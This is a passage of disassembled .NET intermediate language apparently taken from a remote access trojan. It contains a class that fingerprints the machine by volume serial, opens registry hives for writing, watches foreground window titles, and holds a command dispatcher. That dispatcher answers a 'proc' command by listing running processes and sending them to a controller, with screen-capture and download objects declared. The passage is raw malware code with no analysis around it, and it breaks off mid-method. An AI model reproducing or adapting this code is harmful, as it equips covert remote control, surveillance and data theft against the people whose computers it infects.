    // Code size       149 (0x95)
    .maxstack  6
    .locals init (class [mscorlib]System.Array V_0,
             class [mscorlib]System.Collections.Generic.List`1<uint8[]> V_1,
             string[] V_2,
             class [mscorlib]System.IO.MemoryStream V_3,
             class [mscorlib]System.IO.MemoryStream V_4)
    IL_0000:  nop
    IL_0001:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<uint8[]>::.ctor()
    IL_0006:  stloc.1
    IL_0007:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_000c:  stloc.3
    IL_000d:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0012:  stloc.s    V_4
    IL_0014:  ldarga.s   b
    IL_0016:  call       string ClassLibrary1.OK::BS(uint8[]&)
    IL_001b:  ldarg.1
    IL_001c:  ldc.i4.m1
    IL_001d:  ldc.i4.0
    IL_001e:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0023:  stloc.2
    IL_0024:  ldloc.3
    IL_0025:  ldarg.0
    IL_0026:  ldc.i4.0
    IL_0027:  ldloc.2
    IL_0028:  ldc.i4.0
    IL_0029:  ldelem.ref
    IL_002a:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_002f:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0034:  nop
    IL_0035:  ldloc.s    V_4
    IL_0037:  ldarg.0
    IL_0038:  ldloc.2
    IL_0039:  ldc.i4.0
    IL_003a:  ldelem.ref
    IL_003b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0040:  ldarg.1
    IL_0041:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0046:  add.ovf
    IL_0047:  ldarg.0
    IL_0048:  ldlen
    IL_0049:  conv.ovf.i4
    IL_004a:  ldloc.2
    IL_004b:  ldc.i4.0
    IL_004c:  ldelem.ref
    IL_004d:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0052:  ldarg.1
    IL_0053:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0058:  add.ovf
    IL_0059:  sub.ovf
    IL_005a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
    IL_005f:  nop
    IL_0060:  ldloc.1
    IL_0061:  ldloc.3
    IL_0062:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_0067:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<uint8[]>::Add(!0)
    IL_006c:  nop
    IL_006d:  ldloc.1
    IL_006e:  ldloc.s    V_4
    IL_0070:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_0075:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<uint8[]>::Add(!0)
    IL_007a:  nop
    IL_007b:  ldloc.3
    IL_007c:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0081:  nop
    IL_0082:  ldloc.s    V_4
    IL_0084:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0089:  nop
    IL_008a:  ldloc.1
    IL_008b:  callvirt   instance !0[] class [mscorlib]System.Collections.Generic.List`1<uint8[]>::ToArray()
    IL_0090:  stloc.0
    IL_0091:  br.s       IL_0093

    IL_0093:  ldloc.0
    IL_0094:  ret
  } // end of method OK::fx

  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method public static class [mscorlib]Microsoft.Win32.RegistryKey 
          GetKey(string key) cil managed
  {
    // Code size       405 (0x195)
    .maxstack  3
    .locals init (class [mscorlib]Microsoft.Win32.RegistryKey V_0,
             string V_1,
             bool V_2)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_ClassesRoot()
    IL_0011:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_0016:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
    IL_001b:  stloc.2
    IL_001c:  ldloc.2
    IL_001d:  brfalse.s  IL_0065

    IL_001f:  ldarg.0
    IL_0020:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_0025:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_002a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_ClassesRoot()
    IL_002f:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_0034:  ldstr      "\\"
    IL_0039:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003e:  ldstr      ""
    IL_0043:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_0048:  stloc.1
    IL_0049:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_004e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_0053:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_ClassesRoot()
    IL_0058:  ldloc.1
    IL_0059:  ldc.i4.1
    IL_005a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                bool)
    IL_005f:  stloc.0
    IL_0060:  br         IL_0193

    IL_0065:  nop
    IL_0066:  ldarg.0
    IL_0067:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_006c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_0071:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
    IL_0076:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_007b:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
    IL_0080:  stloc.2
    IL_0081:  ldloc.2
    IL_0082:  brfalse.s  IL_00ca

    IL_0084:  ldarg.0
    IL_0085:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_008a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_008f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
    IL_0094:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_0099:  ldstr      "\\"
    IL_009e:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00a3:  ldstr      ""
    IL_00a8:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_00ad:  stloc.1
    IL_00ae:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_00b3:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_00b8:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
    IL_00bd:  ldloc.1
    IL_00be:  ldc.i4.1
    IL_00bf:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                bool)
    IL_00c4:  stloc.0
    IL_00c5:  br         IL_0193

    IL_00ca:  nop
    IL_00cb:  ldarg.0
    IL_00cc:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_00d1:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_00d6:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
    IL_00db:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_00e0:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
    IL_00e5:  stloc.2
    IL_00e6:  ldloc.2
    IL_00e7:  brfalse.s  IL_012c

    IL_00e9:  ldarg.0
    IL_00ea:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_00ef:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_00f4:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
    IL_00f9:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_00fe:  ldstr      "\\"
    IL_0103:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0108:  ldstr      ""
    IL_010d:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_0112:  stloc.1
    IL_0113:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_0118:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_011d:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
    IL_0122:  ldloc.1
    IL_0123:  ldc.i4.1
    IL_0124:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                bool)
    IL_0129:  stloc.0
    IL_012a:  br.s       IL_0193

    IL_012c:  nop
    IL_012d:  ldarg.0
    IL_012e:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_0133:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_0138:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_Users()
    IL_013d:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_0142:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
    IL_0147:  stloc.2
    IL_0148:  ldloc.2
    IL_0149:  brfalse.s  IL_018e

    IL_014b:  ldarg.0
    IL_014c:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_0151:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_0156:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_Users()
    IL_015b:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_0160:  ldstr      "\\"
    IL_0165:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_016a:  ldstr      ""
    IL_016f:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_0174:  stloc.1
    IL_0175:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_017a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_017f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_Users()
    IL_0184:  ldloc.1
    IL_0185:  ldc.i4.1
    IL_0186:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                bool)
    IL_018b:  stloc.0
    IL_018c:  br.s       IL_0193

    IL_018e:  nop
    IL_018f:  ldnull
    IL_0190:  stloc.0
    IL_0191:  br.s       IL_0193

    IL_0193:  ldloc.0
    IL_0194:  ret
  } // end of method OK::GetKey

  .method public static string  getMD5Hash(uint8[] B) cil managed
  {
    // Code size       75 (0x4b)
    .maxstack  3
    .locals init (string V_0,
             uint8 V_1,
             string V_2,
             int32 V_3,
             uint8[] V_4,
             bool V_5)
    IL_0000:  nop
    IL_0001:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000c:  starg.s    B
    IL_000e:  ldstr      ""
    IL_0013:  stloc.2
    IL_0014:  ldarg.0
    IL_0015:  stloc.s    V_4
    IL_0017:  ldc.i4.0
    IL_0018:  stloc.3
    IL_0019:  br.s       IL_0038

    IL_001b:  ldloc.s    V_4
    IL_001d:  ldloc.3
    IL_001e:  ldelem.u1
    IL_001f:  stloc.1
    IL_0020:  ldloc.2
    IL_0021:  ldloca.s   V_1
    IL_0023:  ldstr      "x2"
    IL_0028:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_002d:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0032:  stloc.2
    IL_0033:  ldloc.3
    IL_0034:  ldc.i4.1
    IL_0035:  add.ovf
    IL_0036:  stloc.3
    IL_0037:  nop
    IL_0038:  ldloc.3
    IL_0039:  ldloc.s    V_4
    IL_003b:  ldlen
    IL_003c:  conv.ovf.i4
    IL_003d:  clt
    IL_003f:  stloc.s    V_5
    IL_0041:  ldloc.s    V_5
    IL_0043:  brtrue.s   IL_001b

    IL_0045:  ldloc.2
    IL_0046:  stloc.0
    IL_0047:  br.s       IL_0049

    IL_0049:  ldloc.0
    IL_004a:  ret
  } // end of method OK::getMD5Hash

  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int hwnd,
                                          int32& lpdwProcessID) cil managed preservesig
  {
  }
  .method public static string  GTV(string n) cil managed
  {
    // Code size       104 (0x68)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0011:  ldstr      "Software\\"
      IL_0016:  ldsfld     string ClassLibrary1.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_0025:  ldarg.0
      IL_0026:  ldstr      ""
      IL_002b:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_0030:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0035:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_003a:  stloc.1
      IL_003b:  leave.s    IL_0061

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003d:  dup
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  stloc.3
      IL_0044:  nop
      IL_0045:  ldloc.3
      IL_0046:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004b:  nop
      IL_004c:  ldloc.3
      IL_004d:  stloc.2
      IL_004e:  ldstr      ""
      IL_0053:  stloc.1
      IL_0054:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0059:  nop
      IL_005a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005f:  leave.s    IL_0061

    }  // end handler
    IL_0061:  nop
    IL_0062:  ldloc.1
    IL_0063:  stloc.0
    IL_0064:  br.s       IL_0066

    IL_0066:  ldloc.0
    IL_0067:  ret
  } // end of method OK::GTV

  .method public static string  HWD() cil managed
  {
    // Code size       111 (0x6f)
    .maxstack  8
    .locals init (string V_0,
             string V_1,
             int32 V_2,
             string V_3,
             int32 V_4,
             string V_5,
             int32 V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             string V_9)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldnull
      IL_0003:  stloc.s    V_5
      IL_0005:  ldc.i4.0
      IL_0006:  stloc.s    V_4
      IL_0008:  ldc.i4.0
      IL_0009:  stloc.2
      IL_000a:  ldnull
      IL_000b:  stloc.3
      IL_000c:  ldstr      "SystemDrive"
      IL_0011:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0016:  ldstr      "\\"
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  stloc.s    V_9
      IL_0022:  ldloca.s   V_9
      IL_0024:  ldloca.s   V_5
      IL_0026:  ldc.i4.0
      IL_0027:  ldloca.s   V_6
      IL_0029:  ldloca.s   V_4
      IL_002b:  ldloca.s   V_2
      IL_002d:  ldloca.s   V_3
      IL_002f:  ldc.i4.0
      IL_0030:  call       int32 ClassLibrary1.OK::GetVolumeInformation(string&,
                                                                        string&,
                                                                        int32,
                                                                        int32&,
                                                                        int32&,
                                                                        int32&,
                                                                        string&,
                                                                        int32)
      IL_0035:  pop
      IL_0036:  ldloc.s    V_6
      IL_0038:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_003d:  stloc.1
      IL_003e:  leave.s    IL_0068

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0040:  dup
      IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0046:  stloc.s    V_8
      IL_0048:  nop
      IL_0049:  ldloc.s    V_8
      IL_004b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0050:  nop
      IL_0051:  ldloc.s    V_8
      IL_0053:  stloc.s    V_7
      IL_0055:  ldstr      "ERR"
      IL_005a:  stloc.1
      IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0060:  nop
      IL_0061:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0066:  leave.s    IL_0068

    }  // end handler
    IL_0068:  nop
    IL_0069:  ldloc.1
    IL_006a:  stloc.0
    IL_006b:  br.s       IL_006d

    IL_006d:  ldloc.0
    IL_006e:  ret
  } // end of method OK::HWD

  .method public static void  Ind(uint8[] b) cil managed noinlining nooptimization
  {
    // Code size       7124 (0x1bd4)
    .maxstack  9
    .locals init (string[] V_0,
             uint8[] V_1,
             uint8[] V_2,
             class [System]System.Net.WebClient V_3,
             class [System]System.Net.WebClient V_4,
             bool V_5,
             int32 V_6,
             string V_7,
             string V_8,
             string V_9,
             int32 V_10,
             class [System]System.Diagnostics.Process V_11,
             class [System]System.Diagnostics.Process[] V_12,
             string V_13,
             string V_14,
             class [mscorlib]System.Exception V_15,
             class [mscorlib]System.Exception V_16,
             class [mscorlib]System.Exception V_17,
             class [mscorlib]System.Exception V_18,
             class [mscorlib]System.Exception V_19,
             class [mscorlib]System.Exception V_20,
             string V_21,
             class [mscorlib]System.Exception V_22,
             class [mscorlib]System.Exception V_23,
             class [mscorlib]System.IO.FileInfo V_24,
             class [mscorlib]System.Threading.Thread V_25,
             int32 V_26,
             int32 V_27,
             class [mscorlib]System.Exception V_28,
             class [mscorlib]System.Exception V_29,
             int32 V_30,
             int32 V_31,
             string V_32,
             class [System]System.Diagnostics.Process V_33,
             class [mscorlib]System.Exception V_34,
             class [mscorlib]System.Exception V_35,
             class [mscorlib]System.Exception V_36,
             class [mscorlib]System.Exception V_37,
             class [mscorlib]System.Exception V_38,
             class [mscorlib]System.Exception V_39,
             int32 V_40,
             int32 V_41,
             class [System]System.Diagnostics.Process V_42,
             string V_43,
             class [mscorlib]System.Exception V_44,
             class [mscorlib]System.Exception V_45,
             class [mscorlib]System.Exception V_46,
             class [mscorlib]System.Exception V_47,
             class [mscorlib]System.Exception V_48,
             class [mscorlib]System.Exception V_49,
             class [mscorlib]System.Exception V_50,
             class [mscorlib]System.Exception V_51,
             class [mscorlib]System.Exception V_52,
             class [mscorlib]System.Exception V_53,
             string V_54,
             class [mscorlib]System.Exception V_55,
             class [mscorlib]System.Exception V_56,
             class [mscorlib]System.Exception V_57,
             class [mscorlib]System.Exception V_58,
             uint8[] V_59,
             object V_60,
             string V_61,
             uint8[] V_62,
             object V_63,
             string V_64,
             valuetype [System.Drawing]System.Drawing.Size V_65,
             valuetype [System.Drawing]System.Drawing.Rectangle V_66,
             class [System.Drawing]System.Drawing.Graphics V_67,
             class [System.Drawing]System.Drawing.Bitmap V_68,
             native int V_69,
             string V_70,
             class [mscorlib]System.IO.MemoryStream V_71,
             class [mscorlib]System.IO.MemoryStream V_72,
             class [mscorlib]System.Exception V_73,
             class [mscorlib]System.Exception V_74,
             class [mscorlib]System.Exception V_75,
             class [mscorlib]System.Exception V_76,
             class [mscorlib]System.Exception V_77,
             class [mscorlib]System.Exception V_78,
             class [mscorlib]Microsoft.Win32.RegistryKey V_79,
             string V_80,
             string V_81,
             string V_82,
             string V_83,
             class [mscorlib]System.Exception V_84,
             class [mscorlib]System.Exception V_85,
             class [mscorlib]System.Exception V_86,
             class [mscorlib]System.Exception V_87,
             string V_88,
             string[] V_89,
             int32 V_90,
             class [System]System.Diagnostics.Process[] V_91,
             string V_92,
             string V_93,
             string[] V_94,
             string V_95,
             object[] V_96,
             valuetype [System.Drawing]System.Drawing.Rectangle V_97,
             valuetype [System.Drawing]System.Drawing.Rectangle V_98,
             valuetype [System.Drawing]System.Drawing.Rectangle V_99,
             valuetype [System.Drawing]System.Drawing.Rectangle V_100,
             valuetype [System.Drawing]System.Drawing.Rectangle V_101,
             valuetype [System.Drawing]System.Drawing.Rectangle V_102,
             string V_103,
             string V_104,
             int32 V_105,
             string[] V_106,
             int32 V_107,
             string[] V_108,
             bool V_109,
             bool V_110)
    IL_0000:  nop
    IL_0001:  ldarga.s   b
    IL_0003:  call       string ClassLibrary1.OK::BS(uint8[]&)
    IL_0008:  ldsfld     string ClassLibrary1.OK::Y
    IL_000d:  ldc.i4.m1
    IL_000e:  ldc.i4.0
    IL_000f:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0014:  stloc.0
    IL_0015:  nop
    .try
    {
      IL_0016:  ldloc.0
      IL_0017:  ldc.i4.0
      IL_0018:  ldelem.ref
      IL_0019:  stloc.s    V_9
      IL_001b:  ldloc.s    V_9
      IL_001d:  ldstr      "proc"
      IL_0022:  ldc.i4.0
      IL_0023:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0028:  ldc.i4.0
      IL_0029:  ceq
      IL_002b:  stloc.s    V_109
      IL_002d:  ldloc.s    V_109
      IL_002f:  brfalse    IL_09b5

      IL_0034:  nop
      IL_0035:  ldloc.0
      IL_0036:  ldc.i4.1
      IL_0037:  ldelem.ref
      IL_0038:  stloc.s    V_88
      IL_003a:  nop
      IL_003b:  ldloc.s    V_88
      IL_003d:  ldstr      "~"
      IL_0042:  ldc.i4.0
      IL_0043:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0048:  ldc.i4.0
      IL_0049:  ceq
      IL_004b:  stloc.s    V_110
      IL_004d:  ldloc.s    V_110
      IL_004f:  brfalse    IL_04a2

      IL_0054:  nop
      IL_0055:  ldc.i4.5
      IL_0056:  newarr     [mscorlib]System.String
      IL_005b:  stloc.s    V_89
      IL_005d:  ldloc.s    V_89
      IL_005f:  ldc.i4.0
      IL_0060:  ldstr      "proc"
      IL_0065:  stelem.ref
      IL_0066:  nop
      IL_0067:  ldloc.s    V_89
      IL_0069:  ldc.i4.1
      IL_006a:  ldsfld     string ClassLibrary1.OK::Y
      IL_006f:  stelem.ref
      IL_0070:  nop
      IL_0071:  ldloc.s    V_89
      IL_0073:  ldc.i4.2
      IL_0074:  ldstr      "pid"
      IL_0079:  stelem.ref
      IL_007a:  nop
      IL_007b:  ldloc.s    V_89
      IL_007d:  ldc.i4.3
      IL_007e:  ldsfld     string ClassLibrary1.OK::Y
      IL_0083:  stelem.ref
      IL_0084:  nop
      IL_0085:  ldloc.s    V_89
      IL_0087:  ldc.i4.4
      IL_0088:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_008d:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
      IL_0092:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0097:  stelem.ref
      IL_0098:  nop
      IL_0099:  ldloc.s    V_89
      IL_009b:  call       string [mscorlib]System.String::Concat(string[])
      IL_00a0:  call       bool ClassLibrary1.OK::Send(string)
      IL_00a5:  pop
      IL_00a6:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcesses()
      IL_00ab:  stloc.s    V_12
      IL_00ad:  ldc.i4.5
      IL_00ae:  newarr     [mscorlib]System.String
      IL_00b3:  stloc.s    V_89
      IL_00b5:  ldloc.s    V_89
      IL_00b7:  ldc.i4.0
      IL_00b8:  ldstr      "proc"
      IL_00bd:  stelem.ref
      IL_00be:  nop
      IL_00bf:  ldloc.s    V_89
      IL_00c1:  ldc.i4.1
      IL_00c2:  ldsfld     string ClassLibrary1.OK::Y
      IL_00c7:  stelem.ref
      IL_00c8:  nop
      IL_00c9:  ldloc.s    V_89
      IL_00cb:  ldc.i4.2
      IL_00cc:  ldstr      "~"
      IL_00d1:  stelem.ref
      IL_00d2:  nop
      IL_00d3:  ldloc.s    V_89
